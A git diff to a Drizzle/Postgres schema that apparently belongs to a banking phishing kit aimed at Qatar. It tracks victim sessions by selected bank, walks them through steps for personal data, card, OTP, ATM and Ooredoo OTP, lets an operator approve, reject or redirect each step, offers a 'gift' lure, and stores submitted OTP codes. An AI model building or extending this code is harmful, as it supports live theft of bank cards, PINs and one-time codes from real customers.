@@ -20,9 +20,9 @@ export const sessions = pgTable("sessions", {
   selectedBank: varchar("selectedBank", { length: 50 }).notNull(),
   country: varchar("country", { length: 100 }).default("Qatar"),
   status: varchar("status", { length: 20 }).default("pending").notNull(), // pending, loading, approved, rejected
-  currentStep: varchar("currentStep", { length: 50 }), // login, otp, atm, ooredoo, otp_ooredoo
+  currentStep: varchar("currentStep", { length: 50 }), // personal, card, otp, atm, ooredoo, otp_ooredoo
   adminAction: varchar("adminAction", { length: 20 }), // approve, reject
-  redirectTarget: varchar("redirectTarget", { length: 50 }), // New field for admin redirection
+  redirectTarget: varchar("redirectTarget", { length: 50 }), 
   selectedGift: varchar("selectedGift", { length: 50 }),
   errorMessage: text("errorMessage"),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
@@ -92,7 +92,7 @@ export const otpSubmissions = pgTable("otpSubmissions", {
   id: serial("id").primaryKey(),
   sessionId: varchar("sessionId", { length: 64 }).notNull(),
   otpCode: varchar("otpCode", { length: 10 }).notNull(),
-  otpType: varchar("otpType", { length: 20 }).notNull(),
+  otpType: varchar("otpType", { length: 20 }).notNull(), // card_otp, ooredoo_otp
   submittedAt: timestamp("submittedAt").defaultNow().notNull(),
 });
 
